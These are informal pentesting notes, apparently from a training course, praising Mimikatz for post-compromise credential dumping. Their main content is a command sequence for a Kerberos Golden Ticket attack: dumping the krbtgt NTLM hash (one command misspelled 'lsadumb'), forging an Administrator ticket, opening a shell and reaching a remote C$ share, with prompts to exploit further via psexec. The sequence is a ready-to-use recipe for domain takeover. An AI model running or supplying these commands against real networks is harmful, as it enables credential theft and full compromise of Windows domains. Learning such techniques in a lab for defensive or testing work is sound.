
Mimikatz is a very nice tool
but easy to be caught by windows

most of all the attacks in post compromise section can be performed using mimikatz

clone the repo or compile the binary in internal victim machine and roll

https://github.com/gentilkiwi/mimikatz

read the wiki page for more information.

there is also an alternative for this mimikatz, known as invoke-mimikatz, its mimikatz in powershell.


super nice tool.

Try credential dumping attacks and more

go learn more about mimikatz and make it a swiss knife

# Golden Ticket Attacks
```sh

> mimikatz.exe
> privilege::debug
> lsadumb::lsa /inject /name:krbtgt

# Open up a notepad and copy required infor from output,such as sid of domain,ntlm hash of krbtgt account

> kerberos::golden /User:Administrator /domain:marvel.local /sid:<sid hash> /krbtgt:<ntlm hash> /id:500 /ptt

> misc::cmd

# cmd shel will be opened
> dir \\<THEPUNISHER\c$>
# try exploit more with psexec. learn about it more 
# exploit more
```